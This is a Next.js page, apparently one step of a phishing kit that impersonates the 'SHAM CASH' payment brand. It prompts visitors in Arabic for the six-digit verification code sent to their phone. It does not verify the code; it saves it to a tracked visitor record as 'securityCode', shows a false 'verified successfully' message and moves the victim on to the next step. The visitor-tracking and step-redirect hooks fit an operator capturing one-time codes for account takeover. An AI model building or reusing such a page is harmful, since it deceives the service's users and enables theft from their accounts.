'use client';

import { useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import StepIndicator from '@/components/StepIndicator';
import Logo from '@/components/Logo';
import { useVisitorContext } from '@/contexts/VisitorContext';
import { useSoundSystem } from '@/hooks/useSound';
import { useVisitorRedirect } from '@/hooks/useVisitorRedirect';

export default function Step3Page() {
  const router = useRouter();
  const { updateVisitorData, updateVisitorStep } = useVisitorContext();
  const { play } = useSoundSystem();
  useVisitorRedirect(3);
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (value: string, index: number) => {
    const clean = value.replace(/\D/g, '').slice(0, 1);
    const newOtp = [...otp];
    newOtp[index] = clean;
    setOtp(newOtp);
    if (error) setError('');
    if (clean && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === 'Backspace') {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (text) {
      const newOtp = [...otp];
      for (let i = 0; i < text.length; i++) {
        newOtp[i] = text[i];
      }
      setOtp(newOtp);
      if (error) setError('');
      const nextIndex = Math.min(text.length, 5);
      inputRefs.current[nextIndex]?.focus();
    }
  };

  const handleConfirm = async () => {
    const code = otp.join('');
    if (code.length < 6) {
      setError('يرجى إدخال رمز التحقق كاملاً (6 أرقام)');
      play('alert');
      return;
    }
    setError('');
    setIsSubmitting(true);
    const visitorId = sessionStorage.getItem('currentVisitorId');
    if (visitorId) {
      await updateVisitorData(visitorId, { securityCode: code });
      await updateVisitorStep(visitorId, 4);
    }

    await new Promise((r) => setTimeout(r, 600));
    play('verification-complete');
    setSuccess(true);
    await new Promise((r) => setTimeout(r, 800));
    router.push('/registration/step-4');
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#020617] to-[#020c2b] text-white flex flex-col items-center px-4 py-6" dir="rtl">
      <div className="w-full max-w-md">
        <div className="text-center mb-5">
          <Logo size={80} />
          <h1 className="text-xl font-bold mt-2">SHAM CASH</h1>
          <p className="text-blue-400 text-sm">نظام إدارة الزوار والمدفوعات</p>
        </div>

        <div className="text-center mb-5">
          <h2 className="text-lg font-bold">التحقق من هويتك</h2>
          <p id="otp-instructions" className="text-gray-400 text-sm mt-1">أدخل رمز التحقق المرسل إلى رقمك</p>
        </div>

        <StepIndicator currentStep={3} />

        <div className="bg-[#0f172a] rounded-2xl p-5 shadow-lg">
          {/* OTP inputs — responsive grid fills available width */}
          <div
            role="group"
            aria-labelledby="otp-instructions"
            className="grid grid-cols-6 gap-1.5 sm:gap-2 mb-5"
            dir="ltr"
            onPaste={handlePaste}
          >
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                id={`otp-${i}`}
                type="text"
                inputMode="numeric"
                value={digit}
                onChange={(e) => handleChange(e.target.value, i)}
                onKeyDown={(e) => handleKeyDown(e, i)}
                maxLength={1}
                autoFocus={i === 0}
                aria-label={`رقم التحقق ${i + 1}`}
                className={`
                  h-12 sm:h-14 text-center text-lg sm:text-xl font-bold rounded-xl
                  border-2 bg-[#020617] text-white outline-none transition-all duration-200
                  focus:border-blue-500
                  ${digit ? 'border-blue-500' : 'border-[#1a2e4a]'}
                `}
              />
            ))}
          </div>

          {error && (
            <p className="text-red-400 text-center text-sm mb-4">{error}</p>
          )}

          {success && (
            <p className="text-green-400 text-center text-sm mb-4">
              ✓ تم التحقق بنجاح! جاري الانتقال...
            </p>
          )}

          <button
            onClick={handleConfirm}
            disabled={isSubmitting}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all duration-200 flex items-center justify-center gap-2 disabled:opacity-60"
          >
            {isSubmitting ? (
              <>
                <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                جاري التحقق...
              </>
            ) : (
              <>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                </svg>
                تأكيد
              </>
            )}
          </button>
        </div>

        <div className="text-center mt-4">
          <button
            onClick={() => router.back()}
            className="text-gray-400 hover:text-white text-sm transition-colors"
          >
            ← العودة للخطوة السابقة
          </button>
        </div>
      </div>
    </main>
  );
}
